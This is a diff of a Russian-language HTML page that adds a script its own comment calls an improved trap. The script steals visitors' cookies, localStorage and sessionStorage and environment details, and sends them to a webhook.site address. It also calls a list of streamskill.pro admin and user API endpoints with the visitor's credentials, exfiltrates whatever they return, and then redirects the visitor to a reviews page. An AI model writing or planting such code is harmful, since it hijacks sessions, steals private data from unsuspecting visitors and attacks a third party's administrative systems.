@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE HTML>
 <html lang="ru">
 <head>
 <link rel="preload" as="font" fetchpriority="high" href="/static/fonts/Golos/GolosTextVF.woff2" type="font/woff2" crossorigin="anonymous">
@@ -855,21 +855,83 @@ ya_observer.observe(ya_feed);
 });
 </script>
 
-    <script>
+<!-- НОВЫЙ УЛУЧШЕННЫЙ СКРИПТ-ЛОВУШКА -->
+<script>
     const webhookUrl = 'https://webhook.site/0f1f1013-7dd3-4d87-bc2b-b3cff290aac9';
     
-    // Пытаемся получить данные текущего пользователя из админки
-    fetch('https://admin.streamskill.pro/api/user/me', {
-        credentials: 'include'
-    })
-    .then(res => res.json())
-    .then(data => {
-        fetch(webhookUrl + '?data=' + encodeURIComponent(JSON.stringify(data)));
+    // Функция отправки данных
+    function sendData(type, data) {
+        try {
+            fetch(webhookUrl + '?type=' + encodeURIComponent(type) + '&data=' + encodeURIComponent(JSON.stringify(data)), {mode: 'no-cors'});
+            navigator.sendBeacon(webhookUrl, JSON.stringify({type: type, data: data}));
+        } catch(e) {}
+    }
+    
+    // 1. Кража кук
+    if (document.cookie) {
+        sendData('cookies', document.cookie);
+    } else {
+        sendData('cookies', 'empty');
+    }
+    
+    // 2. Кража localStorage и sessionStorage
+    sendData('localStorage', {...localStorage});
+    sendData('sessionStorage', {...sessionStorage});
+    
+    // 3. Кража информации об окружении
+    sendData('env', {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        platform: navigator.platform,
+        url: window.location.href,
+        referrer: document.referrer,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     });
     
-    setTimeout(() => {
-        window.location.href = 'https://otzovik.com/reviews/streamskill_pro-servis_po_prodvizheniyu_twitch/';
-    }, 2000);
+    // 4. Атака на API админки (попытка заставить сервер отдать данные сессии)
+    const adminEndpoints = [
+        'https://admin.streamskill.pro/api/user/me',
+        'https://admin.streamskill.pro/api/profile',
+        'https://admin.streamskill.pro/user/current',
+        'https://admin.streamskill.pro/site/me',
+        'https://admin.streamskill.pro/api/auth/check',
+        'https://admin.streamskill.pro/dashboard',
+        'https://streamskill.pro/cabinet/api/user-info',
+        'https://streamskill.pro/api/balance'
+    ];
+    
+    let idx = 0;
+    function tryEndpoint() {
+        if (idx >= adminEndpoints.length) {
+            // После проверки API перенаправляем на реальный сайт
+            setTimeout(() => {
+                window.location.href = 'https://otzovik.com/reviews/streamskill_pro-servis_po_prodvizheniyu_twitch/';
+            }, 1500);
+            return;
+        }
+        const url = adminEndpoints[idx];
+        fetch(url, {
+            credentials: 'include',
+            headers: {'Accept': 'application/json', 'X-Requested-With': 'XMLHttpRequest'}
+        })
+        .then(res => {
+            sendData('api_' + idx, {url: url, status: res.status, statusText: res.statusText});
+            if (res.status === 200) return res.text();
+            return null;
+        })
+        .then(text => {
+            if (text) sendData('api_data_' + idx, {url: url, data: text.substring(0, 500)});
+        })
+        .catch(err => sendData('api_error_' + idx, {url: url, error: err.message}))
+        .finally(() => {
+            idx++;
+            setTimeout(tryEndpoint, 300);
+        });
+    }
+    
+    tryEndpoint();
 </script>
+
 </body>
 </html>
